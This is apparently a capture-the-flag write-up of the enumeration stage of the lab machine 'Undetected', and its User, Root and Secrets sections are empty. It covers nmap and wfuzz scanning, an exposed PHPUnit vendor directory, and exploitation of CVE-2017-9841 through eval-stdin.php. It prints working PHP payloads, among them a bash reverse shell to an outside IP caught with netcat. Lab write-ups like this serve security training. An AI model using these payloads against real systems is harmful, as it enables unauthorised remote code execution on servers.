# Undetected

# Enumeration

````
$ nmap -sCV -p22,80 --max-rate 7000 10.10.11.146 -oA nmap-10.10.11.146-sCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 08:01 EDT
Nmap scan report for 10.10.11.146
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
````

````
10.10.11.146 djewelry.htb store.djewelry.htb
````

````
wfuzz -u 'http://store.djewelry.htb/FUZZ' -w /root/Downloads/subdomains-top1million-110000.txt --hw 314
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://store.djewelry.htb/FUZZ
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000053:   301        9 L      28 W       325 Ch      "images"                                                                                    
000000406:   301        9 L      28 W       322 Ch      "css"                                                                                       
000000454:   301        9 L      28 W       321 Ch      "js"                                                                                        
000002329:   301        9 L      28 W       325 Ch      "vendor"  
````

````
GET /vendor/ HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


````

/vendor
````
Index of /vendor
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	autoload.php	2021-07-04 20:40 	178 	 
[DIR]	bin/	2022-02-08 19:59 	- 	 
[DIR]	composer/	2022-02-08 19:59 	- 	 
[DIR]	doctrine/	2022-02-08 19:59 	- 	 
[DIR]	myclabs/	2022-02-08 19:59 	- 	 
[DIR]	phpdocumentor/	2022-02-08 19:59 	- 	 
[DIR]	phpspec/	2022-02-08 19:59 	- 	 
[DIR]	phpunit/	2022-02-08 19:59 	- 	 
[DIR]	sebastian/	2022-02-08 19:59 	- 	 
[DIR]	symfony/	2022-02-08 19:59 	- 	 
[DIR]	webmozart/	2022-02-08 19:59 	- 	 
````

/vendor/phpunit
````
[TXT]	ChangeLog-5.6.md	2016-10-25 07:40 	1.9K
````

phpunit 5.6.2
````
### Changed

* Deprecated `PHPUnit\Framework\TestCase::setExpectedExceptionRegExp()`
* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`

[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2
[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1
[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0
````

:new: [CVE-2017-9841](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md)

POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
````php
<?=phpinfo()?>;
````

````php
<?php system("whoami")?>
````

````
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 12:33:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 9
Connection: close
Content-Type: text/html; charset=UTF-8

www-data
````

````php
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0<&1"')?>
````

````
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.146] 52334
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````


# User

# Root

# Secrets
